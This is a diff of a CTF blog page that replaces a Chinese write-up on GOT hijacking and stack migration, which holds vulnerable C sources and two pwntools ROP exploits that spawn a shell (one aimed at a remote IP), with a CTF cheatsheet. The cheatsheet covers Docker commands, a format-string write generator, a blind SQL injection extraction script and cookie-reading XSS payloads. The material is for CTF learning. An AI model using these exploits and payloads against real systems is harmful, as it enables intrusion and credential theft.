@@ -16,7 +16,7 @@
   <meta name="description" content="Software Security Researcher">
   <meta name="author" content>
   <meta name="keywords" content>
-  <title>Got Hijacking and Stack Migration - AssassinQ</title>
+  <title>CTF Cheatsheet - B3ale</title>
 
   <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
 <link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
@@ -36,7 +36,7 @@
 <!-- 自定义样式保持在最底部 -->
 
 
-<link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+<link rel="alternate" href="/atom.xml" title="B3ale" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 </head>
 
 
@@ -44,7 +44,7 @@
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
     <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
   <div class="container">
-    <a class="navbar-brand" href="/">&nbsp;<strong>AssassinQ</strong>&nbsp;</a>
+    <a class="navbar-brand" href="/">&nbsp;<strong>B3ale</strong>&nbsp;</a>
 
     <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
       <div class="animated-icon"><span></span><span></span><span></span></div>
@@ -118,7 +118,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  Saturday, March 16th 2019, 11:49 am
+                  Thursday, January 1st 1970, 12:00 am
                 </p>
               
 
@@ -127,7 +127,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    967 字
+                    542 字
                   </span>
                 
 
@@ -135,7 +135,7 @@
                   
                   <span class="post-meta">
                       <i class="far fa-clock"></i>
-                      5 分钟
+                      3 分钟
                   </span>
                 
 
@@ -163,137 +163,100 @@
           <div class="post-content mx-auto" id="post">
             
             <div class="markdown-body">
-              <p>记录两道题目，关于<code>Got Hijacking</code>和<code>Stack Migration</code>。</p>
+              <p>Some tips.</p>
 <a id="more"></a>
-<h1 id="Got-Hijacking"><a href="#Got-Hijacking" class="headerlink" title="Got Hijacking"></a>Got Hijacking</h1><p>一般在有格式化字符串漏洞的地方或者 heap 的漏洞利用中经常用到，通过修改某个常规函数的 got 表达到奇怪的目的。</p>
-<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><pre><code class="cpp">// gcc main.c -o main
-#include&lt;stdio.h&gt;
-#include&lt;stdlib.h&gt;
-#include&lt;unistd.h&gt;
-void A(){
-    setvbuf(stdout,0,_IONBF,0);
-    srand(time(0)^getpid());
-    char buf[100];
-    int magic = rand();
-    gets(buf);
-    if(atoi(buf)==magic){
-        puts(&quot;OKay...&quot;);
-    }
-}
-int main(){
-    A();
-}
+<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>通过 Dockerfile 打包镜像（<code>-t</code>：镜像名字及标签）：</p>
+<pre><code class="bash">docker build -t IMAGE_NAME .
 </code></pre>
-<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>想法是直接把 puts 的 got 盖成 system，总共送两次 payload。</p>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><pre><code class="python">#!/usr/bin/env python
-from pwn import *
-# context.log_level=&#39;debug&#39;
-context.terminal = [&#39;tmux&#39;, &#39;sp&#39;, &#39;-h&#39;]
-context.arch = &#39;amd64&#39;
-p = process(&#39;./main&#39;)
-elf = ELF(&#39;./main&#39;)
-libc = ELF(&#39;./libc.so&#39;)
-g = lambda x: next(elf.search(asm(x)))
-A = elf.symbols[&#39;A&#39;]
-gets_plt = elf.plt[&#39;gets&#39;]
-puts_plt = elf.plt[&#39;puts&#39;]
-puts_got = elf.got[&#39;puts&#39;]
-puts_offset = libc.symbols[&#39;puts&#39;]
-system_offset = libc.symbols[&#39;system&#39;]
-str_bin_sh_offset = next(libc.search(&#39;/bin/sh&#39;))
-pop_rdi_ret = g(&#39;pop rdi ; ret&#39;)
-# gdb.attach(p)
-offset = 136
-payload = &#39;A&#39; * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(A)
-p.sendline(payload)
-libc_base = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;)) - puts_offset
-success(&#39;libc_base = &#39; + hex(libc_base))
-system = libc_base + system_offset
-str_bin_sh = libc_base + str_bin_sh_offset
-payload = &#39;A&#39; * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(gets_plt) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(puts_plt)
-p.sendline(payload)
-p.sendline(p64(system))
-p.interactive()
+<p>把容器打包成镜像：</p>
+<pre><code class="bash">docker commit CONTAINER_ID DOCKER_HUB_USERNAME/REPO_NAME[:TAG]
 </code></pre>
-<h1 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h1><p>栈迁移（Stack Migration）是在可以输入的 ROP 链长度不够时，可以扩展输入的方法。 核心概念是将 ROP 链分别写在指定区域，然后再把栈迁移过去执行。</p>
-<p>其中为了保持栈帧平衡最重要的一条指令是 <code>leave ; ret</code>，32 位下等价于 <code>mov esp, ebp ; pop ebp</code>。</p>
-<h2 id="Source-1"><a href="#Source-1" class="headerlink" title="Source"></a>Source</h2><pre><code class="cpp">// gcc main.c -o main -fno-stack-protector -Wl,-z,relro,-z,now
-#include&lt;stdio.h&gt;
-void vul()
-{
-    char buf[0x20];
-    memset(buf,0,0x20);
-    read(0,buf,0x30);
-    puts(buf);
-}
-int main()
-{
-    vul();
-    return 0;
-}
+<p>上传镜像到 Docker Hub：</p>
+<pre><code class="bash">docker push DOCKER_HUB_USERNAME/REPO_NAME[:TAG]
 </code></pre>
-<p>源码中 buf 为 0x20 个字节，但只让读 0x30 个字节，也就是说我们只能修改 ebp 和 ret 的地址。</p>
-<h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>objdump 反汇编一下 vul 函数：</p>
-<pre><code>00000000004006a6 &lt;vul&gt;:
-  4006a6:       55                      push   rbp
-  4006a7:       48 89 e5                mov    rbp,rsp
-  4006aa:       48 83 ec 20             sub    rsp,0x20
-  4006ae:       48 8d 45 e0             lea    rax,[rbp-0x20]
-  4006b2:       ba 20 00 00 00          mov    edx,0x20
-  4006b7:       be 00 00 00 00          mov    esi,0x0
-  4006bc:       48 89 c7                mov    rdi,rax
-  4006bf:       e8 c4 fe ff ff          call   400588 &lt;_init+0x40&gt; ; memset
-  4006c4:       48 8d 45 e0             lea    rax,[rbp-0x20]
-  4006c8:       ba 30 00 00 00          mov    edx,0x30
-  4006cd:       48 89 c6                mov    rsi,rax
-  4006d0:       bf 00 00 00 00          mov    edi,0x0
-  4006d5:       b8 00 00 00 00          mov    eax,0x0
-  4006da:       e8 b1 fe ff ff          call   400590 &lt;_init+0x48&gt; ; read
-  4006df:       48 8d 45 e0             lea    rax,[rbp-0x20]
-  4006e3:       48 89 c7                mov    rdi,rax
-  4006e6:       e8 95 fe ff ff          call   400580 &lt;_init+0x38&gt; ; puts
-  4006eb:       90                      nop
-  4006ec:       c9                      leave
-  4006ed:       c3                      ret
-</code></pre><p>看到 read 其实是往 rbp-0x20 的地方读东西。那么可以想到在第一次 payload 的时候改掉 ebp，然后 ret 到 read 这个地方，于是第二次就可以读一段 rop 到我们设置的 buf 上。然后跳过去。最后一次再跳回到 A，然后往 buf 上写 <code>&quot;system(&quot;/bin/sh&quot;)&quot;</code>，再把栈搬过去就能 getshell。</p>
-<h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><pre><code class="python">#!/usr/bin/env python
-from pwn import *
-# context.log_level = &#39;debug&#39;
-context.arch = &#39;amd64&#39;
-local = 0
-if local:
-    p = process(&#39;./main&#39;)
-else:
-    p = remote(&#39;10.21.13.69&#39;, 10015)
-elf = ELF(&#39;./main&#39;)
-libc = ELF(&#39;./libc.so&#39;)
-g = lambda x: next(elf.search(asm(x)))
-leave_ret = g(&#39;leave ; ret&#39;) # 0x00000000004005ec
-pop_rdi_ret = g(&#39;pop rdi ; ret&#39;) # 0x0000000000400673
-sub_rsp_0x20 = g(&#39;sub rsp, 0x20&#39;) # 0x4005aa
-read_plt = elf.plt[&#39;read&#39;] # 0x400490
-read_got = elf.got[&#39;read&#39;] # 0x600fe8
-puts_plt = elf.plt[&#39;puts&#39;] # 0x400480
-buf = 0x00602000 - 0x100
-vul = elf.symbols[&#39;vul&#39;] # 0x4005a6
-gadget1 = 0x4006c4
-read_offset = libc.symbols[&#39;read&#39;]
-system_offset = libc.symbols[&#39;system&#39;]
-str_bin_sh_offset = next(libc.search(&#39;/bin/sh&#39;))
-# p.send(p64(0xdeadbeef).ljust(0x20,&#39;\x00&#39;))
-# gdb.attach(p)
-payload = &#39;A&#39; * 32 + p64(buf) + p64(gadget1)
-p.send(payload) # edit rbp
-payload = p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vul) + p64(buf - 0x20 - 8) + p64(leave_ret)
-p.send(payload)
-read = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;))
-libc_base = read - read_offset
-success(&#39;libc_base = &#39; + hex(libc_base))
-system = libc_base + system_offset
-str_bin_sh = libc_base + str_bin_sh_offset
-payload = (p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)).ljust(32, &#39;\x00&#39;) + p64(buf - 0x28 - 8) + p64(leave_ret)
-p.send(payload)
-p.interactive()
+<p>启动 Docker 容器（<code>-p</code>：映射端口；<code>-it</code>：和启动的容器进行交互；<code>--rm</code>：退出容器后自动删除；<code>-e</code>：覆盖容器内部的环境变量；<code>-v</code>：挂载本地目录到容器中）：</p>
+<pre><code class="bash"># IP=$(ifconfig en0 | grep inet | awk &#39;$1==&quot;inet&quot; {print $2}&#39;)
+docker run -p 23946:23946 -it --rm --privileged -e DISPLAY=&quot;$IP:0&quot; -v &quot;$PWD:/root/tmp&quot; DOCKER_HUB_USERNAME/REPO_NAME[:TAG] /bin/zsh
+```# Format String
+
+```python
+def fmt(offset, addr, val):
+    payload = &#39;&#39;.join(p32(addr + i) for i in range(4))
+    printed = len(payload)
+    fmt1 = &#39;%{}c&#39;
+    fmt2 = &#39;%{}$hhn&#39;
+    for i in range(4):
+        byte = (val &gt;&gt; (i * 8)) &amp; 0xff
+        addition = (byte - printed + 256) % 256
+        if addition &gt; 0:
+            payload += fmt1.format(str(addition))
+        payload += fmt2.format(str(offset + i))
+        printed += addition
+    return payload
+</code></pre>
+<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><pre><code class="python">import requests
+
+url = &quot;&quot; # &quot;http://127.0.0.1/sqli-labs-master/less-5/index.php?id=&quot;
+payload = &quot;abcdefghijklmnopqrstuvwxyz1234567890!@#{}_-=+[]&amp;();&quot;
+
+def get_databse():
+    res = &quot;&quot;
+    for i in range(1, 100):
+        print(i)
+        for ch in payload:
+            sql = &quot;&quot; # &quot;1&#39; and substr(database(),{},1)=&#39;{}&#39;%23&quot;.format(i, ch)
+            r = requests.get(url + sql)
+            if(len(r.text) == 704):
+                res += ch
+                print(res)
+                break
+    print(&quot;Database: &quot;, res)
+
+def get_tables():
+    res = &quot;&quot;
+    for i in range(1, 100):
+        print(i)
+        for ch in payload:
+            sql = &quot;&quot; # &quot;1&#39; and substr((select group_concat(table_name separator &#39;;&#39;) from information_schema.tables where table_schema=&#39;security&#39;),{},1)=&#39;{}&#39;%23&quot;.format(i, ch)
+            r = requests.get(url + sql)
+            if(len(r.text) == 704):
+                res += ch
+                print(res)
+                break
+    print(&quot;Table names: &quot;, res)
+
+def get_columns():
+    res = &quot;&quot;
+    for i in range(1, 100):
+        print(i)
+        for ch in payload:
+            sql = &quot;&quot; # &quot;1&#39; and substr((select group_concat(column_name separator &#39;;&#39;) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()),{},1)=&#39;{}&#39;%23&quot;.format(i, ch)
+            r = requests.get(url + sql)
+            if(len(r.text) == 704):
+                res += ch
+                print(res)
+                break
+    print(&quot;Column names: &quot;, res)
+
+def get_flag():
+    res = &quot;&quot;
+    for i in range(1, 100):
+        print(i)
+        for ch in payload:
+            sql = &quot;&quot; # &quot;1&#39; and substr((select group_concat(password separator &#39;;&#39;) from security.users),{},1)=&#39;{}&#39;%23&quot;.format(i, ch)
+            r = requests.get(url + sql)
+            if(len(r.text) == 704):
+                res += ch
+                print(res)
+                break
+    print(&quot;Flag: &quot;, res)
+</code></pre>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><pre><code class="js">&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+&lt;ScRipT&gt;alert(document.cookie);&lt;/ScRipT&gt;
+&lt;img src=xss onerror=alert(document.cookie)&gt;
+&lt;var onmouseover=&quot;prompt(1)&quot;&gt;On Mouse Over&lt;/var&gt;
+&lt;video src=1 onerror=alert(document.cookie)&gt;
+...
 </code></pre>
 
             </div>
@@ -307,8 +270,6 @@ p.interactive()
                     
                       <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                     
-                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
-                    
                   </span>
                 
               </p>
@@ -319,18 +280,13 @@ p.interactive()
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
                     
-                      <a href="/2019/03/17/Buffer-Overflow-with-gcc-4-9/">
+                      <a href="/2017/11/18/Windows下利用Hexo和Github搭建博客/">
                         <i class="fa fa-chevron-left"></i>
-                        <span>Buffer Overflow with gcc&gt;=4.9</span>
+                        <span>Windows下利用Hexo和Github搭建博客</span>
                       </a>
                     
                   </div>
                   <div class="post-next col-12 col-md-6">
-                    
-                      <a href="/2019/03/07/Gets一把梭/">
-                        <span>Gets一把梭</span>
-                        <i class="fa fa-chevron-right"></i>
-                      </a>
                     
                   </div>
                 </div>
@@ -516,7 +472,7 @@ p.interactive()
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "Got Hijacking and Stack Migration&nbsp;",
+        "CTF Cheatsheet&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
